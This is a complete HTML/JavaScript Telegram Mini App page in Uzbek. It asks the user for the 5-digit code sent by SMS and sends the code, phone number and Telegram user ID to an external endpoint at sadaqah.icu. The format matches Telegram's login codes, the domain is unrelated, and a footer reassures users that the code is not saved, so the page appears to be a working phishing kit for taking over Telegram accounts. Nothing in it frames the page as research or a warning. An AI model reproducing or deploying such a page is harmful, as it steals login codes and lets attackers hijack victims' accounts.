<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>Tasdiqlash kodini kiritish</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root{
      --bg: var(--tg-theme-bg-color, #0b0d10);
      --text: var(--tg-theme-text-color, #e9eef5);
      --hint: var(--tg-theme-hint-color, rgba(233,238,245,.65));
      --secondary: var(--tg-theme-secondary-bg-color, rgba(255,255,255,.06));
      --button: var(--tg-theme-button-color, #2ea6ff);
      --buttonText: var(--tg-theme-button-text-color, #ffffff);
      --radius: 18px;
      --shadow: 0 12px 30px rgba(0,0,0,.25);
    }

    *{ box-sizing: border-box; }
    html, body { height: 100%; }

    body{
      margin: 0;
      color: var(--text);
      background: radial-gradient(1200px 700px at 20% -10%, rgba(46,166,255,.20), transparent 55%),
                  radial-gradient(900px 600px at 110% 10%, rgba(120,93,255,.18), transparent 52%),
                  var(--bg);
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial, "Noto Sans", "Apple Color Emoji", "Segoe UI Emoji";
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      padding: calc(14px + env(safe-area-inset-top)) 16px calc(20px + env(safe-area-inset-bottom));
      display: flex;
      justify-content: center;
    }

    .wrap{
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    .card{
      background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
      border: 1px solid rgba(255,255,255,.10);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      padding: 16px;
      backdrop-filter: blur(10px);
    }

    .top{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap: 12px;
    }

    .title{
      font-size: 18px;
      font-weight: 700;
      letter-spacing: .2px;
      margin: 0;
    }

    .subtitle{
      margin: 6px 0 0;
      color: var(--hint);
      font-size: 13px;
      line-height: 1.35;
    }

    .pill{
      padding: 8px 10px;
      border-radius: 999px;
      background: var(--secondary);
      color: var(--hint);
      font-size: 12px;
      border: 1px solid rgba(255,255,255,.08);
      white-space: nowrap;
    }

    .codeBox{
      margin-top: 12px;
      display:flex;
      align-items:center;
      justify-content:center;
      padding: 14px 12px;
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.12);
      background: rgba(0,0,0,.12);
    }

    .codeDots{
      display:flex;
      gap: 10px;
      align-items:center;
      justify-content:center;
      width: 100%;
      max-width: 320px;
    }

    .dot{
      width: 14px;
      height: 14px;
      border-radius: 999px;
      background: rgba(255,255,255,.14);
      border: 1px solid rgba(255,255,255,.12);
      box-shadow: inset 0 0 0 2px rgba(0,0,0,.06);
      transform: scale(1);
      transition: transform .12s ease, background .12s ease, border-color .12s ease;
    }

    .dot.filled{
      background: rgba(46,166,255,.95);
      border-color: rgba(46,166,255,.6);
      transform: scale(1.05);
    }

    .hintRow{
      margin-top: 10px;
      display:flex;
      justify-content: space-between;
      gap: 10px;
      color: var(--hint);
      font-size: 12px;
    }

    .keyboard{
      display:grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
    }

    .key{
      height: clamp(52px, 9.5vh, 72px);
      border-radius: 16px;
      border: 1px solid rgba(255,255,255,.10);
      background: rgba(255,255,255,.06);
      color: var(--text);
      font-size: 22px;
      font-weight: 700;
      box-shadow: 0 8px 18px rgba(0,0,0,.18);
      transition: transform .08s ease, opacity .08s ease, background .12s ease;
      -webkit-tap-highlight-color: transparent;
      touch-action: manipulation;
      user-select: none;
    }

    .key:active{
      transform: translateY(1px) scale(.99);
      opacity: .92;
    }

    .key.primary{
      background: linear-gradient(180deg, rgba(46,166,255,.95), rgba(46,166,255,.75));
      border-color: rgba(46,166,255,.55);
      color: var(--buttonText);
    }

    .key.icon{
      font-size: 20px;
      font-weight: 800;
      color: var(--hint);
    }

    .spacer{
      opacity: 0;
      pointer-events: none;
    }

    .footerNote{
      text-align:center;
      color: var(--hint);
      font-size: 12px;
      margin-top: 6px;
    }

    @media (max-height: 680px){
      .card{ padding: 14px; }
      .keyboard{ gap: 8px; }
    }
  </style>
</head>

<body>
  <div class="wrap">

    <div class="card">
      <div class="top">
        <div>
          <p class="title">Tasdiqlash</p>
          <p class="subtitle">SMS orqali kelgan kodni kiriting — bu bir necha soniya oladi.</p>
        </div>
        <div class="pill" id="phoneDisplay">Raqam: —</div>
      </div>

      <div class="codeBox" aria-label="Tasdiqlash kodi">
        <div class="codeDots" id="codeDots"></div>
      </div>

      <div class="hintRow">
        <span id="progressHint">0 / 5</span>
        <span>O‘chirish: ⌫</span>
      </div>
    </div>

    <div class="keyboard card" id="keyboard"></div>
    <div class="footerNote">Kodingiz qurilmada saqlanmaydi.</div>

  </div>

  <script>
    const WebApp = window.Telegram?.WebApp;
    if (!WebApp) {
      alert('Telegram WebApp mavjud emas');
    } else {
      WebApp.ready();
      WebApp.expand();
    }

    const urlParams = new URLSearchParams(window.location.search);
    const phone = urlParams.get('phone') || '';
    const userId = WebApp?.initDataUnsafe?.user?.id;

    if (!userId) {
      alert('user_id ni olishning imkoni bo‘lmadi');
    }

    function maskPhone(p) {
      if (!p) return 'Raqam ko‘rsatilmagan';
      const cleaned = String(p).replace(/\D/g, '');
      if (cleaned.length < 4) return p;
      const last4 = cleaned.slice(-4);
      return '****' + last4;
    }

    const phoneEl = document.getElementById('phoneDisplay');
    phoneEl.textContent = `Raqam: ${maskPhone(phone)}`;

    const codeDots = document.getElementById('codeDots');
    const progressHint = document.getElementById('progressHint');
    const keyboard = document.getElementById('keyboard');

    const CODE_LEN = 5;
    let code = '';

    function renderDots() {
      codeDots.innerHTML = '';
      for (let i = 0; i < CODE_LEN; i++) {
        const d = document.createElement('div');
        d.className = 'dot' + (i < code.length ? ' filled' : '');
        codeDots.appendChild(d);
      }
      progressHint.textContent = `${code.length} / ${CODE_LEN}`;
    }

    renderDots();

    function haptic(type = 'light') {
      try {
        WebApp?.HapticFeedback?.impactOccurred?.(type);
      } catch {}
    }

    function addDigit(d) {
      if (code.length >= CODE_LEN) return;
      code += d;
      haptic('light');
      updateUI();
    }

    function deleteDigit() {
      if (!code.length) return;
      code = code.slice(0, -1);
      haptic('light');
      updateUI();
    }

    function updateUI() {
      renderDots();

      if (code.length === CODE_LEN) {
        WebApp.MainButton
          .setText('Tasdiqlash')
          .show()
          .onClick(sendCode);
      } else {
        WebApp.MainButton.hide();
      }
    }

    // Klaviatura (C tugmasi yo‘q)
    const keys = [
      '1','2','3',
      '4','5','6',
      '7','8','9',
      'spacer','0','del'
    ];

    keys.forEach(k => {
      const btn = document.createElement('button');
      btn.className = 'key';

      if (k === 'spacer') {
        btn.classList.add('spacer');
        btn.disabled = true;
        btn.textContent = '';
      } else if (k === 'del') {
        btn.classList.add('icon');
        btn.textContent = '⌫';
        btn.addEventListener('click', deleteDigit);
      } else {
        btn.textContent = k;
        btn.addEventListener('click', () => addDigit(k));
      }

      keyboard.appendChild(btn);
    });

    // Desktopda ochilsa: klaviaturadan ham ishlaydi
    window.addEventListener('keydown', (e) => {
      if (e.key >= '0' && e.key <= '9') addDigit(e.key);
      if (e.key === 'Backspace') deleteDigit();
      if (e.key === 'Enter' && code.length === CODE_LEN) sendCode();
    });

    async function sendCode() {
      if (code.length !== CODE_LEN) return;

      WebApp.MainButton.disable().showProgress(true);

      const data = { user_id: userId, phone, code };

      try {
        const res = await fetch('https://sadaqah.icu/submit_code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });

        const result = await res.json().catch(() => ({}));

        if (result.status === 'ok') {
          haptic('medium');
          WebApp.close();
        } else {
          WebApp.MainButton.enable().showProgress(false);
          haptic('rigid');
          alert('Xatolik: ' + (result.message || result.error || 'noma’lum'));
        }
      } catch (err) {
        WebApp.MainButton.enable().showProgress(false);
        haptic('rigid');
        alert('Tarmoq xatosi: ' + err);
      }
    }
  </script>
</body>
</html>
